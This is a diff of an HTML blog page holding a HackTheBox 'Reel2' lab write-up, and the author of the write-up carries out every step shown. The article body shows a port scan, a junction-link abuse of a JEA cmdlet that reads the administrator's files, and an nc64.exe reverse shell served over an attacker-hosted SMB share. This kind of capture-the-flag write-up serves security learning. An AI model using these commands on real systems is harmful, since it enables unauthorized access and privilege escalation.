@@ -3,34 +3,38 @@
 
 <head>
   <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <!-- iOS Safari -->
-  <meta name="apple-mobile-web-app-capable" content="yes">
-  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-  <!-- Chrome, Firefox OS and Opera Status Bar Color -->
-  <meta name="theme-color" content="#FFFFFF">
-  <meta property="og:title" content="Reel2 - 10.10.10.210">
-  
-  <meta name="description" content="Hard-difficulty Windows box with a focus on password spraying attacks and NetNTLMv2 hash phishing on Outlook. Privilege escalation by abusing an insecure Powershell JEA cmdlet with symbolic links, while bypassing PS constrained language mode.">
-  <meta property="og:description" content="Hard-difficulty Windows box with a focus on password spraying attacks and NetNTLMv2 hash phishing on Outlook. Privilege escalation by abusing an insecure Powershell JEA cmdlet with symbolic links, while bypassing PS constrained language mode.">
-  
-  <meta property="og:type" content="blog">
-  <title>Reel2 - 10.10.10.210</title>
-  <!-- Favicon -->
-  
-  <link rel="shortcut icon" href="https://samillwong.github.io/images/profile.jpg">
-  
-  <link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.11.1/katex.min.css">
-  <link rel="stylesheet" type="text/css"
-    href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.19.0/themes/prism.min.css">
-  <link rel="stylesheet" type="text/css" href="css/SourceSansPro.css">
-  <link rel="stylesheet" type="text/css" href="css/notablog.css">
-  <link rel="stylesheet" type="text/css" href="css/theme.css">
-  <style>
-    :root {
-      font-size: 18px;
-    }
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<!-- iOS Safari -->
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- Chrome, Firefox OS and Opera Status Bar Color -->
+<meta name="theme-color" content="#FFFFFF">
+<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.11.1/katex.min.css">
+<link rel="stylesheet" type="text/css"
+  href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.19.0/themes/prism.min.css">
+<link rel="stylesheet" type="text/css" href="css/SourceSansPro.css">
+<link rel="stylesheet" type="text/css" href="css/theme.css">
+<link rel="stylesheet" type="text/css" href="css/notablog.css">
+<!-- Favicon -->
 
+  <link rel="shortcut icon" href="https://samiko.me/images/profile.jpg">
+
+<style>
+  :root {
+    font-size: 20px;
+  }
+</style>
+  <title>Reel2 - HackTheBox Writeup (10.10.10.210)&nbsp;|&nbsp;samiko@127.0.0.1~$</title>
+  <meta property="og:type" content="blog">
+  <meta property="og:title" content="Reel2 - HackTheBox Writeup (10.10.10.210)">
+  
+    <meta name="description" content="Hard-difficulty Windows box with a focus on password spraying attacks and NetNTLMv2 hash phishing on Outlook. Privilege escalation by abusing an insecure Powershell JEA cmdlet with symbolic links, while bypassing PS constrained language mode.">
+    <meta property="og:description" content="Hard-difficulty Windows box with a focus on password spraying attacks and NetNTLMv2 hash phishing on Outlook. Privilege escalation by abusing an insecure Powershell JEA cmdlet with symbolic links, while bypassing PS constrained language mode.">
+  
+  
+    <meta property="og:image" content="https://www.hackthebox.eu/storage/avatars/a0c58eb31c178eee9c88bda6fe3b114c.png">
+  
+  <style>
     .DateTagBar {
       margin-top: 1.0rem;
     }
@@ -39,92 +43,99 @@
 
 <body>
   <nav class="Navbar">
-    <a href="/">
-      <div class="Navbar__Btn"><span><img class="inline-img-icon" src="https://samillwong.github.io/images/profile.jpg"></span> <span>Home</span></div>
-    </a>
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-  </nav>
-  <header class="Header">
+  <a href="/">
+    <div class="Navbar__Btn">
       
+        <span><img class="inline-img-icon" src="https://samiko.me/images/profile.jpg"></span>&nbsp;
+      
+      <span>Home</span>
+    </div>
+  </a>
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+</nav>
+  <header class="Header">
+    
     <div class="Header__Spacer Header__Spacer--NoCover">
     </div>
     
-    <div class="Header__Icon"><span><img class="inline-img-icon" src="https://www.hackthebox.eu/storage/avatars/a0c58eb31c178eee9c88bda6fe3b114c.png"></span></div>
+      <div class="Header__Icon">
+        <span><img class="inline-img-icon" src="https://www.hackthebox.eu/storage/avatars/a0c58eb31c178eee9c88bda6fe3b114c.png"></span>
+      </div>
     
-    <h1 class="Header__Title">Reel2 - 10.10.10.210</h1>
+    <h1 class="Header__Title">Reel2 - HackTheBox Writeup (10.10.10.210)</h1>
+    
+      <div class="DateTagBar">
         
-    <div class="DateTagBar">
-          
-      <span class="DateTagBar__Item DateTagBar__Date">Posted on Sat, Mar 20, 2021</span>
-          
-          
-      <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--red">
-          <a href="tag/Hard">Hard</a>
-      </span>
-      
-      <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--blue">
-          <a href="tag/Windows">Windows</a>
-      </span>
-      
-      <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--pink">
-          <a href="tag/Password_Spraying">Password Spraying</a>
-      </span>
-      
-      <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--blue">
-          <a href="tag/Outlook_Web_App">Outlook Web_App</a>
-      </span>
-      
-      <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--orange">
-          <a href="tag/Powershell_JEA">Powershell JEA</a>
-      </span>
-      
-    </div>
-    <div class="Article__Desc">
+          <span class="DateTagBar__Item DateTagBar__Date">Posted on Sat, Mar 20, 2021</span>
+        
+        
+          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--red">
+            <a href="tag/Hard">Hard</a>
+          </span>
+        
+          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--blue">
+            <a href="tag/Windows">Windows</a>
+          </span>
+        
+          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--pink">
+            <a href="tag/Password_Spraying">Password Spraying</a>
+          </span>
+        
+          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--blue">
+            <a href="tag/Outlook_Web_App">Outlook Web_App</a>
+          </span>
+        
+          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--orange">
+            <a href="tag/Powershell_JEA">Powershell JEA</a>
+          </span>
+        
+      </div>
+      <div>
         Hard-difficulty Windows box with a focus on password spraying attacks and NetNTLMv2 hash phishing on Outlook. Privilege escalation by abusing an insecure Powershell JEA cmdlet with symbolic links, while bypassing PS constrained language mode.
-    </div>
-        
+      </div>
+    
   </header>
-      <article id="https://www.notion.so/2854819efc834aa0a7731f32b1146d65" class="PageRoot PageRoot--FullWidth"><h2 id="https://www.notion.so/bb706ad23fc54df0bc7b7729da32224d" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/bb706ad23fc54df0bc7b7729da32224d"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Recon</span></span></h2><ul class="BulletedListWrapper"><li id="https://www.notion.so/73e44bf631fc412a8cbc06bf9d0aa11b" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Port scan:</span></span><div id="https://www.notion.so/f8ff90a82d6e4ce7a05c5a22a602ea42" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ nmap -p- 10.10.10.210 &gt; ports.nmap</code></span></span></p></div><pre id="https://www.notion.so/80a4ff268fff4f64af2b1025a808d3fc" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>PORT     STATE SERVICE
+  <article id="https://www.notion.so/2854819efc834aa0a7731f32b1146d65" class="PageRoot PageRoot--FullWidth"><h2 id="https://www.notion.so/bb706ad23fc54df0bc7b7729da32224d" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/bb706ad23fc54df0bc7b7729da32224d"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Recon</span></span></h2><ul class="BulletedListWrapper"><li id="https://www.notion.so/73e44bf631fc412a8cbc06bf9d0aa11b" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Port scan:</span></span><div id="https://www.notion.so/f8ff90a82d6e4ce7a05c5a22a602ea42" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ nmap -p- 10.10.10.210 &gt; ports.nmap</code></span></span></p></div><pre id="https://www.notion.so/80a4ff268fff4f64af2b1025a808d3fc" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>PORT     STATE SERVICE
 80/tcp   open  http
 443/tcp  open  https
 5985/tcp open  wsman
@@ -320,12 +331,10 @@ Function        Measure-Object
 Function        Out-Default
 Function        Select-Object</span></span></span></code></pre></li><li id="https://www.notion.so/f029605e695540e7b32471f3037c0e04" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">We can see the custom defined </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">Check-File</code></span><span class="SemanticString"> function we found earlier in the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">.psrc</code></span><span class="SemanticString"> file.</span></span></li><li id="https://www.notion.so/56aed35ed7834428b0ad36fbb13585be" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">On k.svensson&#x27;s session, let&#x27;s now create a symbolic link between an arbitrary folder in </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">C:\ProgramData</code></span><span class="SemanticString"> and </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">C:\Users\Administrator</code></span><span class="SemanticString"> to abuse the privileged file read in </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">Check-File</code></span><span class="SemanticString">:</span></span><div id="https://www.notion.so/705fa4fae551421db8fd5a790ef097cb" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">&gt; New-Item -ItemType Junction -Path &#x27;C:\ProgramData\pwn&#x27; -Target &#x27;C:\Users\Administrator&#x27;</code></span></span></p></div></li><li id="https://www.notion.so/8414a51a58154a1e8f7a3d8b86513a87" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Execute the read payload on jea_test_account:</span></span><div id="https://www.notion.so/828337ba63f04cee99da63cf7e2827b2" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">&gt; Check-File C:\ProgramData\pwn\Desktop\root.txt</code></span></span></p></div></li><li id="https://www.notion.so/61d1d25813534810b6b4cefb40f76bfb" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Get root flag!</span></span></li></ul><h2 id="https://www.notion.so/36062e009fa04e23b2f76f7b4a450b99" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/36062e009fa04e23b2f76f7b4a450b99"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Persistence</span></span></h2><ul class="BulletedListWrapper"><li id="https://www.notion.so/50db8be7c4504c799f1baee6eeb65d7f" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">It wasn&#x27;t possible to get an administrator shell on this machine (as far as I was aware).</span></span></li><li id="https://www.notion.so/65d78a2a576a402f9cbed32b8a273b2d" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">There is an easier and quieter way to get a </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">nc</code></span><span class="SemanticString"> reverse shell from k.svensson, without needing to download the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">nc64.exe</code></span><span class="SemanticString"> binary onto the victim&#x27;s computer manually.</span></span></li><li id="https://www.notion.so/73450056bbbb4abea5c2719d9405246e" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Host an SMB share containing the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">nc64.exe</code></span><span class="SemanticString"> binary and listen for a reverse connection:</span></span><div id="https://www.notion.so/2619fc87f8c54868973ccb5a35f54419" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ sudo smbserver.py samiko ./ -smb2support</code></span></span></p></div><div id="https://www.notion.so/325716debe494cb4a85f3d2de619799e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ nc -lvnp 1337</code></span></span></p></div></li><li id="https://www.notion.so/01ed25fdb474435a9b7ebcc8e536ea5d" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">On the restricted PowerShell session, simply execute:</span></span><div id="https://www.notion.so/1cbd30a912014b9abef5b54d73dd43b7" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">&gt; &amp;{\\10.10.14.103\\samiko\\nc64.exe 10.10.14.103 1337 -e powershell.exe}</code></span></span></p></div></li></ul><h2 id="https://www.notion.so/7726482458164c379009b159bbc9e2d9" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/7726482458164c379009b159bbc9e2d9"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Resources</span></span></h2><ol class="NumberedListWrapper"><li id="https://www.notion.so/22d1e1b5b5374ca3b5a62849525ed855" class="NumberedList" value="1"><span class="SemanticStringArray"><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://github.com/munafio/wallstant">https://github.com/munafio/wallstant</a></span></span></li><li id="https://www.notion.so/eb12e321ee8d4de5b1cec6287405625a" class="NumberedList" value="2"><span class="SemanticStringArray"><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://book.hacktricks.xyz/windows/active-directory-methodology/password-spraying#outlook-web-access">https://book.hacktricks.xyz/windows/active-directory-methodology/password-spraying#outlook-web-access</a></span></span></li><li id="https://www.notion.so/0b5c9a7efc28488f9e0fd10e5732418b" class="NumberedList" value="3"><span class="SemanticStringArray"><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://www.ired.team/offensive-security/initial-access/netntlmv2-hash-stealing-using-outlook">https://www.ired.team/offensive-security/initial-access/netntlmv2-hash-stealing-using-outlook</a></span></span></li><li id="https://www.notion.so/43d9b745fb0745a8abb7aa0ba6f08eff" class="NumberedList" value="4"><span class="SemanticStringArray"><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://blog.rapid7.com/2020/04/06/phishing-for-system-on-microsoft-exchange-cve-2020-0688/">https://blog.rapid7.com/2020/04/06/phishing-for-system-on-microsoft-exchange-cve-2020-0688/</a></span></span></li><li id="https://www.notion.so/a7679c9308514c06a6a0dfaeaca8b4d8" class="NumberedList" value="5"><span class="SemanticStringArray"><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enter-pssession?view=powershell-7.1">https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enter-pssession?view=powershell-7.1</a></span></span></li><li id="https://www.notion.so/c101bb3fdba44d1394647e5a4aedb9cd" class="NumberedList" value="6"><span class="SemanticStringArray"><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/">https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/</a></span></span></li><li id="https://www.notion.so/8c388c030fcc4184b020424a1ad59700" class="NumberedList" value="7"><span class="SemanticStringArray"><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://www.ired.team/offensive-security/code-execution/powershell-constrained-language-mode-bypass">https://www.ired.team/offensive-security/code-execution/powershell-constrained-language-mode-bypass</a></span></span></li><li id="https://www.notion.so/5a9371420b974ec7ba9c8b46282c7ba8" class="NumberedList" value="8"><span class="SemanticStringArray"><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://winaero.com/create-symbolic-link-windows-10-powershell/">https://winaero.com/create-symbolic-link-windows-10-powershell/</a></span></span></li></ol></article>
   <footer class="Footer">
-        <div>&copy; samiko@127.0.0.1~$ &centerdot; 2021</div>
-        <div>&centerdot;</div>
-        <div>Powered by <a href="https://github.com/dragonman225/notablog" target="_blank"
-            rel="noopener noreferrer">Notablog</a>.
-        </div>
-    </footer>
+  <div>samiko@127.0.0.1~$</div>
+  <div>&centerdot;</div>
+  <div>Powered by <a href="https://github.com/dragonman225/notablog" target="_blank" rel="noopener noreferrer">Notablog</a>.</div>
+</footer>
 </body>
 
 </html>
